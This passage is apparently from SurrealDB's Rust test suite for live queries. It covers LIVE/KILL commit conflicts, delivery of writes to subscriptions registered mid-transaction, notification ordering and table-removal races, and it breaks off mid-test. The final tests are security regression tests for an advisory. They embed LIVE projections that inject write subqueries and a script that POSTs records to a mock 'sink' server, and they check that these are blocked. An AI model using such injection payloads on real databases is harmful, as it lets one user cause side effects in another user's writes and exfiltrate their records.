/// A grouped fsync stretches every commit, which serialises the contenders on one
/// live-query stamp for longer than a statement's bounded re-runs cover on a
/// slow disk. The tests that pin the re-run behaviour itself run without it;
/// the ones that run with it are ignored, and show where the budget runs out.
#[cfg(feature = "kv-surrealkv")]
async fn surrealkv_ds_with(
	dir: &temp_dir::TempDir,
	fsync: bool,
) -> Result<std::sync::Arc<surrealdb_core::kvs::Datastore>> {
	use surrealdb_rpc::capabilities::Capabilities;

	let (send, _recv) = surrealdb_core::channel::bounded(1000);
	let query = if fsync {
		""
	} else {
		"?sync=never"
	};
	let ds = surrealdb_core::kvs::Datastore::builder()
		.without_maintenance_tasks()
		.with_capabilities(Capabilities::all())
		.with_notify(send)
		.build_with_path(&format!("surrealkv://{}{query}", dir.path().display()))
		.await?;
	crate::helpers::new_ns_db(&ds, "test", "test").await?;
	Ok(ds)
}

/// Register a live query on `table` and kill it, failing on any error.
#[cfg(feature = "kv-surrealkv")]
async fn live_then_kill(
	ds: &surrealdb_core::kvs::Datastore,
	ses: &Session,
	table: &str,
) -> Result<()> {
	let mut res = ds.execute(&format!("LIVE SELECT * FROM {table}"), ses, None).await?;
	let id = res.remove(0).result?;
	let Value::Uuid(id) = id else {
		return Err(anyhow::anyhow!("LIVE answered {id:?}, not a uuid"));
	};
	let mut res = ds.execute(&format!("KILL u'{id}'"), ses, None).await?;
	res.remove(0).result?;
	Ok(())
}

// A bare `LIVE` and a bare `KILL` each read and then write their table's
// live-query stamp, so statements that overlap on one table can lose a commit
// conflict. The server re-runs the loser, so whatever order a connection's
// concurrent registrations and aborts fall in, every `LIVE` it answered is
// gone once its `KILL` answered, and neither statement reports a conflict.
#[cfg(feature = "kv-surrealkv")]
async fn live_and_kill_on_one_task(fsync: bool) -> Result<()> {
	use futures::StreamExt;

	const ROUNDS: usize = 20;
	const PER_ROUND: usize = 30;

	let dir = temp_dir::TempDir::new()?;
	let ds = surrealkv_ds_with(&dir, fsync).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	for round in 0..ROUNDS {
		let table = format!("person_{round}");
		skip_ok(&mut ds.execute(&format!("DEFINE TABLE {table}"), &ses, None).await?, 1)?;
		// Polled as a connection polls its requests: each is resumed in the
		// order it is woken, not the order it was sent.
		let results: Vec<Result<()>> = (0..PER_ROUND)
			.map(|_| live_then_kill(&ds, &ses, &table))
			.collect::<futures::stream::FuturesUnordered<_>>()
			.collect()
			.await;
		for result in results {
			if let Err(e) = result {
				return Err(anyhow::anyhow!("round {round}: {e}"));
			}
		}
		let left = lives(&ds, &ses, &table).await?;
		assert!(left.is_empty(), "round {round} left live queries: {left:?}");
	}
	Ok(())
}

// The same as connections of their own: each pair runs on its own task, so
// the statements overlap on every worker thread at once rather than taking
// turns on one task, and more of them lose to one winner together.
#[cfg(feature = "kv-surrealkv")]
async fn live_and_kill_across_connections(fsync: bool) -> Result<()> {
	const ROUNDS: usize = 20;
	const PER_ROUND: usize = 8;

	let dir = temp_dir::TempDir::new()?;
	let ds = surrealkv_ds_with(&dir, fsync).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	for round in 0..ROUNDS {
		let table = format!("person_{round}");
		skip_ok(&mut ds.execute(&format!("DEFINE TABLE {table}"), &ses, None).await?, 1)?;
		let tasks: Vec<_> = (0..PER_ROUND)
			.map(|_| {
				let ds = ds.clone();
				let ses = ses.clone();
				let table = table.clone();
				tokio::spawn(async move { live_then_kill(&ds, &ses, &table).await })
			})
			.collect();
		for task in tasks {
			if let Err(e) = task.await? {
				return Err(anyhow::anyhow!("round {round}: {e}"));
			}
		}
		let left = lives(&ds, &ses, &table).await?;
		assert!(left.is_empty(), "round {round} left live queries: {left:?}");
	}
	Ok(())
}

#[cfg(feature = "kv-surrealkv")]
#[tokio::test(flavor = "multi_thread")]
async fn concurrent_live_and_kill_on_one_task_leave_no_live_query() -> Result<()> {
	live_and_kill_on_one_task(false).await
}

#[cfg(feature = "kv-surrealkv")]
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn concurrent_live_and_kill_across_connections_leave_no_live_query() -> Result<()> {
	live_and_kill_across_connections(false).await
}

// The same with commits fsynced, as by default: 30 contenders on one table's
// live-query stamp use up the statement's bounded re-runs and a conflict
// reaches the caller.
#[cfg(feature = "kv-surrealkv")]
#[ignore = "30 concurrent pairs exhaust the bounded re-runs when commits are fsynced"]
#[tokio::test(flavor = "multi_thread")]
async fn concurrent_live_and_kill_on_one_task_with_fsync() -> Result<()> {
	live_and_kill_on_one_task(true).await
}

#[cfg(feature = "kv-surrealkv")]
#[ignore = "30 concurrent pairs exhaust the bounded re-runs when commits are fsynced"]
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn concurrent_live_and_kill_across_connections_with_fsync() -> Result<()> {
	live_and_kill_across_connections(true).await
}

// A `LIVE` that overlaps a `KILL` inside a transaction block the caller owns
// is not re-run on its behalf: the block's conflict surfaces to the caller,
// and its `KILL` does not apply. The overlap is arranged by time alone: the
// `LIVE` is sent while the block sleeps, and it may still commit before the
// block's `KILL` has read the table, in which case nothing conflicts and the
// scenario is tried again on a fresh table.
#[cfg(feature = "kv-surrealkv")]
#[tokio::test(flavor = "multi_thread")]
async fn a_conflict_inside_a_transaction_block_surfaces() -> Result<()> {
	const TRIES: usize = 10;

	let dir = temp_dir::TempDir::new()?;
	let ds = surrealkv_ds_with(&dir, false).await?;
	let ses_a = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let ses_b = Session::owner().with_ns("test").with_db("test").with_rt(true);

	for attempt in 0..TRIES {
		let table = format!("person_{attempt}");
		skip_ok(&mut ds.execute(&format!("DEFINE TABLE {table}"), &ses_a, None).await?, 1)?;
		let res = &mut ds.execute(&format!("LIVE SELECT * FROM {table}"), &ses_a, None).await?;
		let id_a = res.remove(0).result?;
		assert_eq!(id_a.kind(), Kind::Uuid);

		let block = tokio::spawn({
			let ds = ds.clone();
			let ses_a = ses_a.clone();
			let vars = vars! { id: id_a.clone() };
			async move { ds.execute("BEGIN; KILL $id; SLEEP 500ms; COMMIT;", &ses_a, Some(vars)).await }
		});
		tokio::time::sleep(Duration::from_millis(100)).await;
		let res = &mut ds.execute(&format!("LIVE SELECT * FROM {table}"), &ses_b, None).await?;
		let id_b = res.remove(0).result?;
		assert_eq!(id_b.kind(), Kind::Uuid);

		let responses = block.await??;
		let conflicted = responses.iter().any(|r| {
			r.result.as_ref().is_err_and(|e| {
				e.query_details() == Some(&surrealdb_types::QueryError::TransactionConflict)
					|| e.to_string().to_lowercase().contains("resource busy")
			})
		});
		let listed = lives(&ds, &ses_b, &table).await?;
		if !conflicted {
			// The `LIVE` committed before the block read the table: the
			// block saw it, and its `KILL` applied.
			assert!(
				responses.iter().all(|r| r.result.is_ok()),
				"a block that did not conflict should succeed: {responses:?}"
			);
			assert_eq!(listed, vec![id_string(&id_b)?]);
			continue;
		}
		for id in [&id_a, &id_b] {
			let id = id_string(id)?;
			assert!(listed.contains(&id), "{id} should still be listed: {listed:?}");
		}
		return Ok(());
	}
	Err(anyhow::anyhow!("no try of {TRIES} overlapped the block with the LIVE"))
}

#[cfg(feature = "kv-surrealkv")]
fn id_string(id: &Value) -> Result<String> {
	let Value::Uuid(id) = id else {
		return Err(anyhow::anyhow!("LIVE answered {id:?}, not a uuid"));
	};
	Ok(id.to_string())
}

/// A live projection that traverses a graph edge reports the edges present
/// when the record changes. A `RELATE` writes no `person` record, so only the
/// later `UPDATE` notifies, and it carries the new edge.
#[tokio::test]
async fn live_graph_projection_sees_a_new_edge() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let res = &mut dbs
		.execute(
			"CREATE person:jessy; CREATE person:jamie;
			LIVE SELECT <-love<-person AS who FROM person;
			RELATE person:jamie->love->person:jessy;
			UPDATE person:jessy SET n = 1;",
			&ses,
			None,
		)
		.await?;
	assert_eq!(res.len(), 5);
	let n = tokio::time::timeout(Duration::from_secs(5), channel.recv()).await??;
	assert_eq!(n.action, Action::Update);
	assert_eq!(n.result, syn::value("{ who: [person:jamie] }").unwrap());
	tokio::time::sleep(Duration::from_millis(300)).await;
	assert!(channel.try_recv().is_err());
	Ok(())
}

/// A `LIVE SELECT DIFF` notification carries the operations `value::diff`
/// returns: a replaced scalar is a `replace` op, and a string becomes a
/// `change` op holding a text patch.
#[tokio::test]
async fn live_diff_notifications_carry_value_diff_operations() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let res = &mut dbs
		.execute(
			"CREATE t:1 SET n = 301, s = 'x';
			LIVE SELECT DIFF FROM t;
			UPDATE t:1 SET n = 439, s = 'y';",
			&ses,
			None,
		)
		.await?;
	assert_eq!(res.len(), 3);
	let n = tokio::time::timeout(Duration::from_secs(5), channel.recv()).await??;
	assert_eq!(n.action, Action::Update);
	assert_eq!(
		n.result,
		syn::value(
			"[{ op: 'replace', path: '/n', value: 439 }, { op: 'change', path: '/s', value: '@@ -1,1 +1,1 @@\n-x\n+y\n' }]"
		)
		.unwrap()
	);
	Ok(())
}

/// Run `block`, a transaction block that sleeps before it commits, and
/// register `live` while it sleeps; answer the block's responses and the live
/// query's id.
async fn register_during(
	dbs: &std::sync::Arc<surrealdb_core::kvs::Datastore>,
	ses: &Session,
	block: &str,
	live: &str,
) -> Result<(Vec<surrealdb_rpc::QueryResult>, Value)> {
	let running = tokio::spawn({
		let dbs = dbs.clone();
		let ses = ses.clone();
		let block = block.to_owned();
		async move { dbs.execute(&block, &ses, None).await }
	});
	tokio::time::sleep(Duration::from_millis(100)).await;
	let id = dbs.execute(live, ses, None).await?.remove(0).result?;
	assert_eq!(id.kind(), Kind::Uuid);
	let responses = running.await??;
	let failed: Vec<String> =
		responses.iter().filter_map(|r| r.result.as_ref().err().map(ToString::to_string)).collect();
	if !failed.is_empty() {
		return Err(anyhow::anyhow!("the block failed: {failed:?}"));
	}
	Ok((responses, id))
}

/// The next notification, failing after two seconds.
async fn next_notification(
	channel: &surrealdb_core::channel::Receiver<surrealdb_types::Notification>,
	what: &str,
) -> Result<surrealdb_types::Notification> {
	tokio::time::timeout(Duration::from_secs(2), channel.recv())
		.await
		.map_err(|_| anyhow::anyhow!("{what} was never delivered"))?
		.map_err(Into::into)
}

// A write whose snapshot predates a `LIVE`'s commit, and that commits after
// it, does not see the subscription while it writes. Once it commits it finds
// the registration it missed and tells the subscriber of the record as it now
// stands. The write is not refused for it.
#[tokio::test(flavor = "multi_thread")]
async fn a_write_in_flight_while_a_live_registers_is_delivered() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	let (_, id) = register_during(
		&dbs,
		&ses,
		"BEGIN; CREATE tb:1 SET n = 1; SLEEP 500ms; COMMIT;",
		"LIVE SELECT * FROM tb",
	)
	.await?;
	let notification = next_notification(&channel, "the committed CREATE").await?;
	assert_eq!(notification.action, Action::Create);
	assert_eq!(Value::Uuid(notification.id), id);
	assert_eq!(notification.result, syn::value("{ id: tb:1, n: 1 }")?);
	Ok(())
}

// Every CLOCK read a missed subscription makes answers one instant, as it
// does for a subscription the write saw.
#[tokio::test(flavor = "multi_thread")]
async fn a_missed_subscription_reads_one_statement_clock() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	register_during(
		&dbs,
		&ses,
		"BEGIN; CREATE tb:1; SLEEP 500ms; COMMIT;",
		"LIVE SELECT time::now() AS a, time::now() AS b FROM tb",
	)
	.await?;
	let notification = next_notification(&channel, "the committed CREATE").await?;
	let Value::Object(result) = notification.result else {
		panic!("expected an object, got {:?}", notification.result);
	};
	assert_eq!(result.get("a"), result.get("b"));
	Ok(())
}

// A write made while a registration on its table is in flight keeps its
// images, so a missed subscriber's `$before` is the record before the write.
#[tokio::test(flavor = "multi_thread")]
async fn a_missed_subscription_judges_before_by_the_write() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(
		&mut dbs
			.execute("DEFINE TABLE tb; CREATE tb:1 SET status = 'pending';", &ses, None)
			.await?,
		2,
	)?;

	register_during(
		&dbs,
		&ses,
		"BEGIN; SLEEP 300ms; UPDATE tb:1 SET status = 'done'; SLEEP 200ms; COMMIT;",
		"LIVE SELECT * FROM tb WHERE $before.status = 'pending'",
	)
	.await?;
	let notification = next_notification(&channel, "the committed UPDATE").await?;
	assert_eq!(notification.action, Action::Update);
	assert_eq!(notification.result, syn::value("{ id: tb:1, status: 'done' }")?);
	Ok(())
}

// A missed `DIFF` subscriber is told the operations from the record before
// the write to the record after it.
#[tokio::test(flavor = "multi_thread")]
async fn a_missed_diff_subscription_is_told_the_writes_operations() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb; CREATE tb:1 SET n = 1;", &ses, None).await?, 2)?;

	register_during(
		&dbs,
		&ses,
		"BEGIN; SLEEP 300ms; UPDATE tb:1 SET n = 2; SLEEP 200ms; COMMIT;",
		"LIVE SELECT DIFF FROM tb",
	)
	.await?;
	let notification = next_notification(&channel, "the committed UPDATE").await?;
	assert_eq!(notification.action, Action::Update);
	assert_eq!(notification.result, syn::value("[{ op: 'replace', path: '/n', value: 2 }]")?);
	Ok(())
}

// A write that a seen subscription observes derives the table's `COMPUTED`
// fields onto its images, which no stored record holds. The record still
// stands as the write left it, so a missed subscriber is told the write's
// images, `$before` among them.
#[tokio::test(flavor = "multi_thread")]
async fn a_missed_subscription_judges_before_by_the_write_beside_computed_fields() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(
		&mut dbs
			.execute(
				"DEFINE TABLE tb; DEFINE FIELD c ON tb COMPUTED 42; CREATE tb:1 SET status = 'pending';",
				&ses,
				None,
			)
			.await?,
		3,
	)?;
	dbs.execute("LIVE SELECT * FROM tb", &ses, None).await?.remove(0).result?;

	let (_, missed) = register_during(
		&dbs,
		&ses,
		"BEGIN; SLEEP 300ms; UPDATE tb:1 SET status = 'done'; SLEEP 200ms; COMMIT;",
		"LIVE SELECT * FROM tb WHERE $before.status = 'pending'",
	)
	.await?;
	let mut told = Vec::new();
	for _ in 0..2 {
		told.push(next_notification(&channel, "the committed UPDATE").await?);
	}
	let notification = told
		.into_iter()
		.find(|notification| Value::Uuid(notification.id) == missed)
		.ok_or_else(|| anyhow::anyhow!("the missed subscriber was not told"))?;
	assert_eq!(notification.action, Action::Update);
	assert_eq!(notification.result, syn::value("{ c: 42, id: tb:1, status: 'done' }")?);
	Ok(())
}

// The subscription's own clauses decide what a missed subscriber is told, as
// they do for one the write saw: a `WHERE` that rejects the record sends
// nothing.
#[tokio::test(flavor = "multi_thread")]
async fn a_missed_subscription_is_judged_by_its_where() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	register_during(
		&dbs,
		&ses,
		"BEGIN; CREATE tb:1 SET n = 1; CREATE tb:2 SET n = 2; SLEEP 500ms; COMMIT;",
		"LIVE SELECT * FROM tb WHERE n = 2",
	)
	.await?;
	let notification = next_notification(&channel, "the matching CREATE").await?;
	assert_eq!(notification.record, syn::value("tb:2")?);
	tokio::time::sleep(Duration::from_millis(300)).await;
	assert!(channel.try_recv().is_err(), "the rejected record must not be sent");
	Ok(())
}

// A transaction that registers a live query is not owed its own earlier
// writes: they were made before the subscription existed.
#[tokio::test(flavor = "multi_thread")]
async fn a_transaction_is_not_owed_its_own_writes_before_its_live() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	let responses =
		dbs.execute("BEGIN; CREATE tb:1; LIVE SELECT * FROM tb; COMMIT;", &ses, None).await?;
	for response in responses {
		response.result?;
	}
	tokio::time::sleep(Duration::from_millis(300)).await;
	assert!(channel.try_recv().is_err(), "a write before the LIVE is not owed to it");
	Ok(())
}

// The same holds for a transaction its owner drives across several requests:
// the request that registers the live query is not the one that wrote.
#[tokio::test(flavor = "multi_thread")]
async fn a_caller_owned_transaction_is_not_owed_its_writes_before_its_live() -> Result<()> {
	use std::sync::Arc;

	use surrealdb_core::kvs::QueryRequest;
	use surrealdb_kvs::TransactionType;

	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	let tx = Arc::new(dbs.transaction(TransactionType::Write).await?);
	for query in ["CREATE tb:1", "LIVE SELECT * FROM tb"] {
		for response in
			dbs.run(QueryRequest::new(query, &ses).with_transaction(Arc::clone(&tx))).await?
		{
			response.result?;
		}
	}
	tx.commit().await?;
	tokio::time::sleep(Duration::from_millis(300)).await;
	assert!(channel.try_recv().is_err(), "a write before the LIVE is not owed to it");
	Ok(())
}

// A subscriber the write saw is told once, not twice.
#[tokio::test(flavor = "multi_thread")]
async fn a_seen_subscription_is_told_once() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;
	let first = dbs.execute("LIVE SELECT * FROM tb", &ses, None).await?.remove(0).result?;

	let (_, second) = register_during(
		&dbs,
		&ses,
		"BEGIN; CREATE tb:1; SLEEP 500ms; COMMIT;",
		"LIVE SELECT * FROM tb",
	)
	.await?;
	let mut told = Vec::new();
	for _ in 0..2 {
		told.push(Value::Uuid(next_notification(&channel, "a CREATE").await?.id));
	}
	tokio::time::sleep(Duration::from_millis(300)).await;
	assert!(channel.try_recv().is_err(), "each subscriber is told once");
	assert!(told.contains(&first) && told.contains(&second), "{told:?}");
	Ok(())
}

// Writers and registrations overlapping at random: every write that commits
// after a `LIVE` has answered reaches that live query.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn every_write_committed_after_a_live_answers_reaches_it() -> Result<()> {
	use std::collections::{HashMap, HashSet};

	const WRITERS: usize = 40;
	const LIVES: usize = 6;

	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	let writers: Vec<_> = (0..WRITERS)
		.map(|n| {
			let dbs = dbs.clone();
			let ses = ses.clone();
			tokio::spawn(async move {
				tokio::time::sleep(Duration::from_millis((n * 7 % 200) as u64)).await;
				let sleep = 20 + n * 13 % 120;
				let sql = format!("BEGIN; CREATE tb:{n}; SLEEP {sleep}ms; COMMIT;");
				// The block commits once its SLEEP has run, so no earlier than this.
				let commits_from =
					tokio::time::Instant::now() + Duration::from_millis(sleep as u64);
				let responses = dbs.execute(&sql, &ses, None).await?;
				for response in responses {
					response.result?;
				}
				Ok::<_, anyhow::Error>((n, commits_from))
			})
		})
		.collect();
	let mut lives = Vec::new();
	for n in 0..LIVES {
		tokio::time::sleep(Duration::from_millis(30 + (n * 11 % 20) as u64)).await;
		let id = dbs.execute("LIVE SELECT * FROM tb", &ses, None).await?.remove(0).result?;
		let Value::Uuid(id) = id else {
			anyhow::bail!("LIVE answered {id:?}");
		};
		lives.push((id, tokio::time::Instant::now()));
	}
	let mut committed = Vec::new();
	for writer in writers {
		committed.push(writer.await??);
	}
	let mut told: HashMap<surrealdb_types::Uuid, HashSet<String>> = HashMap::new();
	while let Ok(Ok(n)) = tokio::time::timeout(Duration::from_millis(500), channel.recv()).await {
		told.entry(n.id).or_default().insert(format!("{:?}", n.record));
	}
	for (id, answered) in &lives {
		for (n, commits_from) in &committed {
			if commits_from > answered {
				let record = format!("{:?}", syn::value(&format!("tb:{n}"))?);
				assert!(
					told.get(id).is_some_and(|records| records.contains(&record)),
					"tb:{n}, committed after live query {id} answered, never reached it"
				);
			}
		}
	}
	Ok(())
}

/// A broker that holds the delivery of the first notification it is handed until its gate opens,
/// and records every delivery in the order it completes.
#[derive(Debug)]
struct GatedBroker {
	gate: tokio::sync::Semaphore,
	held: std::sync::atomic::AtomicBool,
	delivered: async_channel::Sender<Notification>,
}

impl MessageBroker for GatedBroker {
	fn should_emit(&self, node_id: [u8; 16], target_node: [u8; 16]) -> Result<bool> {
		Ok(node_id == target_node)
	}

	fn send(&self, item: RoutedNotification) -> Pin<Box<dyn Future<Output = ()> + Send + '_>> {
		Box::pin(async move {
			if !self.held.swap(true, std::sync::atomic::Ordering::SeqCst) {
				let _ = self.gate.acquire().await;
			}
			let _ = self.delivered.send(item.into_notification()).await;
		})
	}
}

/// The notifications of one writer's commits reach the broker in the order of those commits, even
/// when the broker has not finished delivering an earlier one by the time a later commit is made.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn one_writers_notifications_reach_the_broker_in_commit_order() -> Result<()> {
	const WRITES: i64 = 5;
	let (delivered, received) = async_channel::unbounded();
	let broker = Arc::new(GatedBroker {
		gate: tokio::sync::Semaphore::new(0),
		held: Default::default(),
		delivered,
	});
	let (notify, _) = surrealdb_core::channel::bounded(1);
	let dbs = Datastore::builder()
		.without_maintenance_tasks()
		.with_capabilities(Capabilities::all())
		.with_notify(notify)
		.with_live_query_broker(Arc::clone(&broker) as Arc<dyn MessageBroker>)
		.build_with_path("memory")
		.await?;
	new_ns_db(&dbs, "test", "test").await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	let res = dbs.execute("DEFINE TABLE counter; LIVE SELECT * FROM counter;", &ses, None).await?;
	assert!(res.into_iter().all(|r| r.result.is_ok()));
	for n in 1..=WRITES {
		let res = dbs.execute("UPSERT counter:1 SET n = $n;", &ses, Some(vars! { "n": n })).await?;
		assert!(res.into_iter().all(|r| r.result.is_ok()));
	}
	// Every later commit has been made while the first notification is still held.
	tokio::time::sleep(Duration::from_millis(100)).await;
	broker.gate.add_permits(1);
	let mut seen = Vec::new();
	while seen.len() < WRITES as usize {
		let n = tokio::time::timeout(Duration::from_secs(5), received.recv()).await??;
		let Value::Object(object) = n.result else {
			panic!("a notification without a record: {n:?}");
		};
		let Some(Value::Number(value)) = object.get("n") else {
			panic!("a record without a value: {object:?}");
		};
		seen.push(value.to_int().expect("an integer value"));
	}
	assert_eq!(seen, (1..=WRITES).collect::<Vec<_>>());
	Ok(())
}

/// Whether any statement of a transaction block lost a commit conflict.
fn block_conflicted(responses: &[surrealdb_rpc::QueryResult]) -> bool {
	responses.iter().any(|r| {
		r.result.as_ref().is_err_and(|e| {
			e.query_details() == Some(&surrealdb_types::QueryError::TransactionConflict)
				|| e.to_string().to_lowercase().contains("resource busy")
		})
	})
}

// A `LIVE` that registers while a `REMOVE TABLE` of its table is in flight
// must not outlive the table unannounced: it is refused, the removal loses
// the conflict, or the subscriber receives its `Killed`.
#[tokio::test(flavor = "multi_thread")]
async fn a_live_registered_during_a_remove_table_is_killed_or_refused() -> Result<()> {
	let (channel, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
	skip_ok(&mut dbs.execute("DEFINE TABLE tb", &ses, None).await?, 1)?;

	let block = tokio::spawn({
		let dbs = dbs.clone();
		let ses = ses.clone();
		async move { dbs.execute("BEGIN; REMOVE TABLE tb; SLEEP 500ms; COMMIT;", &ses, None).await }
	});
	tokio::time::sleep(Duration::from_millis(100)).await;
	let live = dbs.execute("LIVE SELECT * FROM tb", &ses, None).await?.remove(0).result;
	let responses = block.await??;

	let removed = !block_conflicted(&responses);
	let Ok(id) = live else {
		// The registration was refused: the removal is what stands.
		assert!(removed, "a refused LIVE leaves nothing for the removal to lose to");
		for response in responses {
			response.result?;
		}
		let info = dbs.execute("INFO FOR DB", &ses, None).await?.remove(0).result?;
		assert!(!info.to_sql().contains("tb:"), "the table must be gone: {}", info.to_sql());
		return Ok(());
	};
	if !removed {
		// The removal lost the conflict: the table and its subscription stand,
		// and the subscription is still served.
		skip_ok(&mut dbs.execute("CREATE tb:1", &ses, None).await?, 1)?;
		let notification = tokio::time::timeout(Duration::from_secs(2), channel.recv())
			.await
			.map_err(|_| anyhow::anyhow!("the surviving live query was never notified"))??;
		assert_eq!(notification.action, Action::Create);
		assert_eq!(Value::Uuid(notification.id), id);
		return Ok(());
	}
	for response in responses {
		response.result?;
	}
	let notification = tokio::time::timeout(Duration::from_secs(2), channel.recv())
		.await
		.map_err(|_| anyhow::anyhow!("the live query on a removed table was never told"))??;
	assert_eq!(notification.action, Action::Killed);
	assert_eq!(Value::Uuid(notification.id), id);
	Ok(())
}

/// A LIVE query's subscriber-authored projection and WHERE clauses run at
/// notification time inside the triggering write's transaction. They must not
/// perform writes (GHSA-pvv9-h693-m8r4): a write subquery there lets a
/// subscriber inject side effects into another user's write. Register a LIVE
/// query whose projection writes, then trigger a notification, and assert the
/// write subquery did not execute.
#[tokio::test]
async fn live_query_clauses_may_not_write() -> Result<()> {
	let (_, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	let res = &mut dbs
		.execute("DEFINE TABLE person SCHEMALESS; DEFINE TABLE audit SCHEMALESS;", &ses, None)
		.await?;
	skip_ok(res, 2)?;

	// Register a LIVE query whose projection contains a write subquery.
	let res = &mut dbs
		.execute("LIVE SELECT *, (CREATE audit SET saw = id) AS exfil FROM person;", &ses, None)
		.await?;
	let lqid = res.remove(0).result?;
	assert_eq!(
		lqid.kind(),
		Kind::Uuid,
		"the LIVE query must register before the write that fires it"
	);

	// Trigger a notification by writing to the watched table.
	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
	skip_ok(res, 1)?;

	// The subscriber's write subquery must not have executed.
	let res = &mut dbs.execute("SELECT VALUE id FROM audit;", &ses, None).await?;
	let audit = res.remove(0).result?;
	assert_eq!(
		audit,
		Value::Array(Default::default()),
		"a write in a LIVE projection must not execute at notification time, audit held: {audit:?}",
	);

	Ok(())
}

/// The LIVE write guard (GHSA-pvv9-h693-m8r4) must hold across a re-entry
/// boundary, not only for a write subquery evaluated directly in the clause.
///
/// An embedded script's `surrealdb.query()` bridge rebuilds its execution frame
/// from the clause's `Options`, so the guard must sit on the `Options` and not
/// on the notification context alone. A subscriber that wraps `CREATE audit` in
/// a script reaches the same injected write otherwise, once for every triggering
/// transaction. The `api::invoke` builtin rebuilds its endpoint frame from the
/// same `Options`, so it is closed by the same guard.
#[cfg(feature = "scripting")]
#[tokio::test]
async fn live_query_script_clause_may_not_write() -> Result<()> {
	let (_, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	let res = &mut dbs
		.execute("DEFINE TABLE person SCHEMALESS; DEFINE TABLE audit SCHEMALESS;", &ses, None)
		.await?;
	skip_ok(res, 2)?;

	// Register a LIVE query whose projection runs a write through an embedded
	// script's `surrealdb.query()` bridge.
	let res = &mut dbs
		.execute(
			"LIVE SELECT *, (function() { return await surrealdb.query('CREATE audit SET saw = true'); }) AS exfil FROM person;",
			&ses,
			None,
		)
		.await?;
	let lqid = res.remove(0).result?;
	assert_eq!(
		lqid.kind(),
		Kind::Uuid,
		"the LIVE query must register before the write that fires it"
	);

	// Trigger a notification by writing to the watched table.
	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
	skip_ok(res, 1)?;

	// The subscriber's script write must not have executed.
	let res = &mut dbs.execute("SELECT VALUE id FROM audit;", &ses, None).await?;
	let audit = res.remove(0).result?;
	assert_eq!(
		audit,
		Value::Array(Default::default()),
		"a write in a LIVE projection's script must not execute at notification time, audit held: {audit:?}",
	);

	Ok(())
}

/// A LIVE projection's script can reach an external system through the builtin
/// bridge (`surrealdb.functions.http.post`), not only through SurrealQL
/// re-entry. That path must honour the LIVE no-external-write guard
/// (GHSA-pvv9-h693-m8r4): the bridge dispatches a builtin without passing the
/// VM's own guard, so a POST would exfiltrate the triggering record once for
/// every write. The sink must receive nothing.
#[cfg(all(feature = "scripting", feature = "http"))]
#[tokio::test]
async fn live_query_script_http_post_may_not_exfiltrate() -> Result<()> {
	use wiremock::matchers::{method, path};
	use wiremock::{Mock, MockServer, ResponseTemplate};

	let server = MockServer::start().await;
	Mock::given(method("POST"))
		.and(path("/sink"))
		.respond_with(ResponseTemplate::new(200))
		.mount(&server)
		.await;

	let (_, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	let res = &mut dbs.execute("DEFINE TABLE person SCHEMALESS;", &ses, None).await?;
	skip_ok(res, 1)?;

	// The projection POSTs to an external sink from a script.
	let sql = format!(
		"LIVE SELECT *, (function() {{ return await surrealdb.functions.http.post('{}/sink', {{ saw: true }}); }}) AS exfil FROM person;",
		server.uri()
	);
	let res = &mut dbs.execute(&sql, &ses, None).await?;
	let lqid = res.remove(0).result?;
	assert_eq!(
		lqid.kind(),
		Kind::Uuid,
		"the LIVE query must register before the write that fires it"
	);

	// Trigger a notification by writing to the watched table.
	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
